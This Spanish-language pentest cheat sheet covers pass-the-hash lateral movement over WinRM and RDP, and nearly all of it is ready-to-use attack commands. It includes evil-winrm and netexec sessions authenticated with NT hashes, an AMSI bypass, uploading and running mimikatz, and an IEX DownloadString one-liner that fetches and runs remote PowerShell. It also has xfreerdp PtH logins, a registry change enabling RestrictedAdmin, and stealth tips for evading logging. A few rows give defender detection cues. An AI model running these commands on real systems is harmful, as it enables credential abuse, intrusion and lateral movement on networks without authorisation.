---
aliases:
  - PtH WinRM
  - PtH RDP
  - evil-winrm
  - xfreerdp pth
  - RestrictedAdmin
tags:
  - type/technique
  - technique/lateral-movement
  - technique/credential-access
  - asset/active-directory
  - cred/ntlm
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Pass-the-Hash]]"
---
# Pass-the-Hash - WinRM y RDP

***

## evil-winrm (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `evil-winrm -i <target> -u user -H <NT>` | WinRM shell con PtH | Standard. |
| `evil-winrm -i <target> -u user -H <NT> -P 5986 -S` | LDAPS (5986) | Encrypted. |
| `evil-winrm -i <target> -u user -H <NT> -s ./scripts/` | Mount scripts dir | Upload helpers. |
| `evil-winrm -i <target> -u user -H <NT> -e ./bin/` | Mount executables dir | Upload binaries. |
| `Bypass-4MSI` (dentro evil-winrm) | AMSI bypass | Pre-payload. |
| `upload <local-file>` | Upload to remote | Standard. |
| `download <remote-file>` | Download from remote | Exfil. |
| `menu` | Show available commands | Help. |
^pth-winrm-evilwinrm

```bash
# Pipeline standard
evil-winrm -i 10.10.10.5 -u corp\jsmith -H aabbccdd1122334455... -S

# Within shell:
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> upload mimikatz.exe
*Evil-WinRM* PS> .\mimikatz.exe
```

___

## netexec WinRM

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc winrm <target> -u user -H <NT>` | Validate WinRM access | Pre-attack. |
| `nxc winrm <target> -u user -H <NT> -x 'whoami'` | Single command | Quick exec. |
| `nxc winrm <target> -u user -H <NT> -X 'IEX (New-Object Net.WebClient).DownloadString(...)'` | PowerShell payload | Standard. |
| `nxc winrm <range> -u user -H <NT>` | Sweep WinRM access | Multi-host. |
| `nxc winrm <target> -u user -H <NT> --port 5986` | HTTPS WinRM | Encrypted (default cert validation off). |
^pth-winrm-nxc

```bash
# Sweep + targeted
nxc winrm 10.10.10.0/24 -u corp\jsmith -H aabbcc... | grep "Pwn3d"
nxc winrm <pwned-host> -u corp\jsmith -H aabbcc... -X '<payload>'
```

**Permission required:** `Remote Management Users` group OR `Administrators` local. WinRM service running (`winrm quickconfig` o GPO).

___

## Impacket-WMIExec (Alternativa)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-wmiexec -hashes :<NT> corp.local/user@<target>` | RCE via WMI (similar al SMB pero sin admin SMB) | Si WinRM bloqueado. |
| `impacket-wmiexec -hashes :<NT> corp.local/user@<target> -shell-type powershell` | PS shell | PS-friendly. |
^pth-winrm-wmiexec

**Caveat:** WMIExec requiere SMB admin (output via `\\target\ADMIN$`). NO es equivalente directo a WinRM.

___

## RDP RestrictedAdmin Mode (PtH)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `xfreerdp /v:<target> /u:user /d:corp.local /pth:<NT> /dynamic-resolution` | RDP via PtH (Linux) | Standard. |
| `xfreerdp /v:<target> /u:user /d:corp.local /pth:<NT> /smart-sizing /clipboard` | + clipboard + smart-sizing | UX. |
| `xfreerdp /v:<target> /u:user /d:corp.local /pth:<NT> /sound:sys:alsa` | + audio | Edge. |
| `mstsc /restrictedAdmin /v:<target>` (Windows post `sekurlsa::pth`) | Windows native | Post-injection. |
^pth-winrm-rdpfreerdp

**Requiere en target:** registry `HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0` (DWORD).

```cmd
:: Habilitar RestrictedAdmin en target (post-exploitation, priv local)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

```bash
# Linux PtH RDP
xfreerdp /v:10.10.10.5 /u:atacante /d:corp.local /pth:aabbcc11... /dynamic-resolution
```

___

## RestrictedAdmin Default Status

| **Detalle** | **Status** |
|:---:|:---:|
| Default Win10/Win11 | **Disabled** (no PtH RDP). |
| Default Win Server 2012R2+ | **Disabled**. |
| Common enable scenario | GPO admin tier explícito. |
| Habilitar requiere | Local admin previo (registry write). |
^pth-winrm-restrictedadmin

**Realidad práctica:** RDP PtH **no funciona out-of-the-box** moderno. Si pega = misconfig específico o ya pwneaste el host (registry write).

___

## WinRM Permissions Audit

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADGroupMember "Remote Management Users" -Recursive` | Members del group | Audit. |
| `Get-PSSessionConfiguration` (en target) | WinRM endpoints habilitados | Local audit. |
| `winrm get winrm/config/listener` | Listener status (5985 HTTP, 5986 HTTPS) | Local check. |
| `nxc winrm <target> -u u -H <NT>` (output `Pwn3d!`) | Validate | Pre-attack. |
^pth-winrm-perms

___

## OPSEC Considerations

| **Práctica** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Prefer WinRM (5985/5986) sobre SMB | Less alert signature | Stealth. |
| HTTPS WinRM (5986) si disponible | Encrypted | OPSEC. |
| evil-winrm `Bypass-4MSI` antes de payloads PS | AMSI bypass | Pre-payload. |
| Avoid RDP si tenés WinRM | Visual session = más logs | Stealth. |
| RDP RestrictedAdmin = priv-required setup | No PtH directo Win modern | Caveat. |
| Detection: 4624 logon type 3 + 4648 explicit credential | SIEM rule | Defender side. |
| Connection from non-jumphost source | Anomaly | Defender side. |
^pth-winrm-opsec

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `WSManFault: 5` (Access denied) | Sin perms en `Remote Management Users` | Need group membership o local admin. |
| `Connection refused 5985` | WinRM service down o blocked | Test puerto + firewall. |
| `Failed to negotiate authentication` | Auth method mismatch | Try `--no-pass -k` Kerberos. |
| `xfreerdp: certificate trust` | TLS cert untrusted | `/cert-ignore` flag. |
| RDP login fails con `/pth:` | RestrictedAdmin disabled en target | Registry enable o use other method. |
^pth-winrm-errors

***
